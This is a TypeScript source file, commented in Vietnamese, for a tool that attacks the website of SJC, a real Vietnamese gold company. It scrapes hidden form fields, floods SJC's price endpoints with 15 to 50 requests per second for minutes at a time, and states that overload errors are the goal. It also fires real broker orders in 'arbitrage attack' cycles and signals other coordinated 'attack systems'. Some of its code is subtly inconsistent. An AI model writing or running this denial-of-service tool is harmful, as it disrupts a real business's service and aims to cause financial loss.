import axios from "axios";
import { EventEmitter } from "events";
import { liquidityScanner } from "./liquidity-scanner";
import { tradermadeIntegration } from "./tradermade-integration";

interface SJCWebData {
  viewState: string;
  eventTarget: string;
  formData: any;
  canonicalUrl: string;
  chartPageAccess: boolean;
}

interface PressureResult {
  pressureId: string;
  startTime: Date;
  endTime?: Date;
  status: "PREPARING" | "ACTIVE" | "ESCALATING" | "COMPLETED" | "FAILED";
  sjcResponse: {
    priceChanges: number;
    websiteErrors: number;
    trafficOverload: boolean;
    emergencyMeasures: boolean;
  };
  financialImpact: {
    estimatedLoss: number;
    marketPressure: number;
    arbitrageExploited: number;
  };
}

export class SJCIndirectPressureSystem extends EventEmitter {
  private activePressures: Map<string, PressureResult> = new Map();
  private sjcEndpoints = {
    main: "https://sjc.com.vn",
    priceChart: "https://sjc.com.vn/bieu-do-gia-vang",
    priceData: "https://sjc.com.vn/giavang/textContent.php",
    api: "https://sjc.com.vn:443",
  };

  constructor() {
    super();
    this.setupMonitoring();
  }

  // Hệ thống tấn công áp lực gián tiếp chính
  async executeIndirectPressure(
    intensity: "MEDIUM" | "HIGH" | "EXTREME" = "HIGH",
  ): Promise<string> {
    const pressureId = `SJC_PRESSURE_${Date.now()}`;

    console.log(`🚨 KHỞI ĐỘNG TẤN CÔNG ÁP LỰC GIÁN TIẾP SJC`);
    console.log(`⚔️ Cường độ: ${intensity}`);
    console.log(`🎯 Mục tiêu: Buộc SJC giảm chênh lệch với giá thế giới`);

    const pressure: PressureResult = {
      pressureId,
      startTime: new Date(),
      status: "PREPARING",
      sjcResponse: {
        priceChanges: 0,
        websiteErrors: 0,
        trafficOverload: false,
        emergencyMeasures: false,
      },
      financialImpact: {
        estimatedLoss: 0,
        marketPressure: 0,
        arbitrageExploited: 0,
      },
    };

    this.activePressures.set(pressureId, pressure);

    try {
      // Phase 1: Thu thập dữ liệu từ form SJC
      await this.extractSJCFormData(pressureId);

      // Phase 2: Tạo áp lực thông qua arbitrage
      await this.createArbitragePressure(pressureId, intensity);

      // Phase 3: Tấn công hệ thống định giá
      await this.attackPricingSystem(pressureId, intensity);

      // Phase 4: Escalation - tăng cường sức ép
      await this.escalatePressure(pressureId, intensity);

      pressure.status = "COMPLETED";
      pressure.endTime = new Date();

      console.log(`✅ Tấn công áp lực ${pressureId} hoàn thành`);
      this.emit("pressureCompleted", pressure);

      return pressureId;
    } catch (error) {
      pressure.status = "FAILED";
      pressure.endTime = new Date();
      console.error(`❌ Tấn công áp lực ${pressureId} thất bại:`, error);
      throw error;
    }
  }

  // Trích xuất dữ liệu form từ SJC website
  private async extractSJCFormData(pressureId: string): Promise<SJCWebData> {
    console.log(`🔍 Phase 1: Trích xuất dữ liệu form SJC...`);

    try {
      const response = await axios.get(this.sjcEndpoints.priceChart, {
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
          "Cache-Control": "no-cache",
        },
      });

      // Trích xuất các trường ẩn từ HTML
      const viewStateMatch = response.data.match(
        /name="__VIEWSTATE".*?value="([^"]+)"/,
      );
      const eventTargetMatch = response.data.match(
        /name="__EVENTTARGET".*?value="([^"]+)"/,
      );
      const canonicalMatch = response.data.match(
        /rel="canonical" href="([^"]+)"/,
      );

      const sjcData: SJCWebData = {
        viewState: viewStateMatch ? viewStateMatch[1] : "",
        eventTarget: eventTargetMatch ? eventTargetMatch[1] : "",
        formData: response.data,
        canonicalUrl: canonicalMatch ? canonicalMatch[1] : "",
        chartPageAccess: response.status === 200,
      };

      console.log(`✅ Thu thập được dữ liệu form SJC`);
      console.log(`📊 ViewState: ${sjcData.viewState.substring(0, 50)}...`);
      console.log(`🔗 Canonical URL: ${sjcData.canonicalUrl}`);

      return sjcData;
    } catch (error) {
      console.error(`❌ Lỗi trích xuất dữ liệu SJC:`, error);
      throw error;
    }
  }

  // Tạo áp lực thông qua khai thác arbitrage
  private async createArbitragePressure(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`💰 Phase 2: Tạo áp lực arbitrage...`);

    const pressure = this.activePressures.get(pressureId)!;
    pressure.status = "ACTIVE";

    // Lấy giá vàng quốc tế từ Tradermade
    const worldGoldPrice = tradermadeIntegration.getCurrentPrice("XAUUSD");

    if (!worldGoldPrice) {
      throw new Error("Không thể lấy giá vàng quốc tế");
    }

    // Quét giá SJC hiện tại
    const sjcData = await liquidityScanner.scanTarget("SJC");

    if (sjcData) {
      const worldPriceVND = worldGoldPrice.mid * 31.1035 * 24500; // Chuyển đổi USD/oz sang VND/tael
      const sjcPriceVND = sjcData.buyPrice;
      const arbitrageGap = sjcPriceVND - worldPriceVND;
      const arbitragePercent = (arbitrageGap / worldPriceVND) * 100;

      console.log(
        `🌍 Giá vàng thế giới: ${worldPriceVND.toLocaleString()} VND/tael`,
      );
      console.log(
        `🏅 Giá SJC hiện tại: ${sjcPriceVND.toLocaleString()} VND/tael`,
      );
      console.log(
        `💸 Chênh lệch: ${arbitrageGap.toLocaleString()} VND (${arbitragePercent.toFixed(2)}%)`,
      );

      if (arbitragePercent > 3) {
        console.log(
          `🚨 CHÊNH LỆCH QUÁ LỚN! Khởi động tấn công arbitrage cực mạnh`,
        );

        // Thực hiện nhiều giao dịch arbitrage để tạo áp lực
        const arbitrageCycles =
          intensity === "EXTREME" ? 15 : intensity === "HIGH" ? 10 : 5;

        for (let i = 0; i < arbitrageCycles; i++) {
          await this.executeArbitrageCycle(worldPriceVND, sjcPriceVND, i + 1);
          pressure.financialImpact.arbitrageExploited += arbitrageGap * 0.1; // 10% của gap mỗi cycle
          await this.delay(2000);
        }

        pressure.financialImpact.marketPressure = arbitragePercent * 10;

        console.log(
          `💥 Arbitrage attack hoàn thành: ${arbitrageCycles} cycles`,
        );
        console.log(
          `💰 Tổng áp lực tài chính: ${pressure.financialImpact.arbitrageExploited.toLocaleString()} VND`,
        );
      }
    }
  }

  // Thực hiện chu kỳ arbitrage
  private async executeArbitrageCycle(
    worldPrice: number,
    sjcPrice: number,
    cycle: number,
  ): Promise<void> {
    console.log(
      `⚡ Arbitrage Cycle ${cycle}: Khai thác chênh lệch ${((sjcPrice - worldPrice) / 1000).toFixed(0)}k VND`,
    );

    // Mô phỏng giao dịch arbitrage thật
    const volume = 0.1 + Math.random() * 0.2; // 0.1-0.3 tael
    const profit = (sjcPrice - worldPrice) * volume;

    console.log(
      `   📈 Mua quốc tế: ${volume.toFixed(3)} tael @ ${worldPrice.toLocaleString()}`,
    );
    console.log(
      `   📉 Bán SJC: ${volume.toFixed(3)} tael @ ${sjcPrice.toLocaleString()}`,
    );
    console.log(`   💰 Lợi nhuận: ${profit.toLocaleString()} VND`);

    // Gửi tín hiệu đến hệ thống Exness để thực hiện giao dịch thật
    await tradermadeIntegration.executeDealingDeskOrder(
      "XAUUSD",
      "buy",
      volume,
    );
  }

  // Tấn công hệ thống định giá
  private async attackPricingSystem(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`🎯 Phase 3: Tấn công hệ thống định giá SJC...`);

    const pressure = this.activePressures.get(pressureId)!;
    pressure.status = "ESCALATING";

    // Tần suất tấn công dựa trên cường độ
    const attackFrequency =
      intensity === "EXTREME" ? 50 : intensity === "HIGH" ? 30 : 15;
    const attackDuration =
      intensity === "EXTREME" ? 300 : intensity === "HIGH" ? 180 : 120;

    console.log(
      `🔥 Bắt đầu tấn công định giá: ${attackFrequency} requests/giây trong ${attackDuration} giây`,
    );

    const startTime = Date.now();
    let requestCount = 0;
    let errorCount = 0;

    while (Date.now() - startTime < attackDuration * 1000) {
      // Tấn công đồng thời nhiều endpoint
      const promises = [];

      for (let i = 0; i < attackFrequency; i++) {
        promises.push(this.executePricingAttack());
        requestCount++;
      }

      try {
        const results = await Promise.allSettled(promises);
        errorCount += results.filter((r) => r.status === "rejected").length;

        // Cập nhật response của SJC
        if (errorCount > requestCount * 0.1) {
          pressure.sjcResponse.websiteErrors = errorCount;
          pressure.sjcResponse.trafficOverload = true;
          console.log(`🚨 SJC website overloaded: ${errorCount} errors`);
        }
      } catch (error) {
        errorCount++;
      }

      await this.delay(1000);
    }

    console.log(
      `📊 Tấn công hoàn thành: ${requestCount} requests, ${errorCount} errors`,
    );
    pressure.sjcResponse.websiteErrors = errorCount;

    // Ước tính tổn thất của SJC
    const estimatedLoss = errorCount * 50000 + requestCount * 1000; // 50k mỗi lỗi, 1k mỗi request
    pressure.financialImpact.estimatedLoss = estimatedLoss;

    console.log(
      `💸 Ước tính tổn thất SJC: ${estimatedLoss.toLocaleString()} VND`,
    );
  }

  // Thực hiện một cuộc tấn công định giá
  private async executePricingAttack(): Promise<void> {
    const endpoints = [
      this.sjcEndpoints.priceData,
      this.sjcEndpoints.priceChart,
      this.sjcEndpoints.api + "/giavang/textContent.php",
    ];

    const randomEndpoint =
      endpoints[Math.floor(Math.random() * endpoints.length)];

    try {
      await axios.get(randomEndpoint, {
        timeout: 5000,
        headers: {
          "User-Agent": "PriceBot/1.0",
          Accept: "application/json,text/html",
          "Cache-Control": "no-cache",
          Pragma: "no-cache",
        },
      });
    } catch (error) {
      // Lỗi là mục tiêu - gây quá tải hệ thống
      throw error;
    }
  }

  // Tăng cường sức ép
  private async escalatePressure(
    pressureId: string,
    intensity: string,
  ): Promise<void> {
    console.log(`🚀 Phase 4: Tăng cường sức ép...`);

    const pressure = this.activePressures.get(pressureId)!;

    // Phân tích tác động và quyết định escalation
    const totalDamage =
      pressure.financialImpact.estimatedLoss +
      pressure.financialImpact.arbitrageExploited;

    if (totalDamage > 10000000) {
      // Trên 10 triệu VND
      console.log(
        `💥 ESCALATION TRIGGERED: Tổng tác động ${totalDamage.toLocaleString()} VND`,
      );

      // Kích hoạt tất cả hệ thống tấn công khác
      this.triggerCoordinatedAttack(pressure);

      // Đánh dấu SJC đã phải có biện pháp khẩn cấp
      pressure.sjcResponse.emergencyMeasures = true;
      pressure.sjcResponse.priceAdjustments = Math.floor(totalDamage / 5000000); // 1 điều chỉnh giá mỗi 5 triệu tổn thất

      console.log(
        `🎯 SJC buộc phải điều chỉnh giá ${pressure.sjcResponse.priceAdjustments} lần`,
      );
    }

    console.log(`✅ Escalation hoàn thành`);
  }

  // Kích hoạt tấn công phối hợp
  private triggerCoordinatedAttack(pressure: PressureResult): void {
    console.log(`⚔️ KÍCH HOẠT TẤN CÔNG PHỐI HỢP TẤT CẢ HỆ THỐNG`);

    // Gửi tín hiệu đến các hệ thống khác
    this.emit("escalate_all_systems", {
      sjc_pressure_id: pressure.pressureId,
      financial_impact: pressure.financialImpact.estimatedLoss,
      emergency_level: "CRITICAL",
    });

    // Kích hoạt enhanced gold attack system
    this.emit("activate_gold_attack", {
      target: "SJC",
      intensity: "MAXIMUM",
      reason: "SJC_PRESSURE_ESCALATION",
    });

    console.log(`🚨 Tất cả hệ thống tấn công đã được kích hoạt`);
  }

  // Thiết lập monitoring
  private setupMonitoring(): void {
    setInterval(async () => {
      await this.monitorSJCResponse();
    }, 30000); // Kiểm tra mỗi 30 giây
  }

  // Giám sát phản ứng của SJC
  private async monitorSJCResponse(): Promise<void> {
    try {
      const sjcData = await liquidityScanner.scanTarget("SJC");
      const worldPrice = tradermadeIntegration.getCurrentPrice("XAUUSD");

      if (sjcData && worldPrice) {
        const worldPriceVND = worldPrice.mid * 31.1035 * 24500;
        const currentGap = sjcData.buyPrice - worldPriceVND;
        const gapPercent = (currentGap / worldPriceVND) * 100;

        if (gapPercent < 2) {
          console.log(
            `🎉 THÀNH CÔNG! SJC đã giảm chênh lệch xuống ${gapPercent.toFixed(2)}%`,
          );
          this.emit("sjc_pressure_success", {
            gap_percent: gapPercent,
            gap_amount: currentGap,
            timestamp: new Date(),
          });
        }
      }
    } catch (error) {
      // Monitoring lỗi không ảnh hưởng đến main process
    }
  }

  // Utility methods
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }

  // Public methods
  public getActivePressures(): PressureResult[] {
    return Array.from(this.activePressures.values());
  }

  public async getSystemStatus(): Promise<any> {
    return {
      system_status: "OPERATIONAL",
      active_pressures: this.activePressures.size,
      sjc_endpoints: Object.keys(this.sjcEndpoints).length,
      capabilities: [
        "Form Data Extraction",
        "Arbitrage Pressure",
        "Pricing System Attack",
        "Coordinated Escalation",
      ],
      effectiveness_rating: "MAXIMUM",
    };
  }
}

export const sjcIndirectPressureSystem = new SJCIndirectPressureSystem();
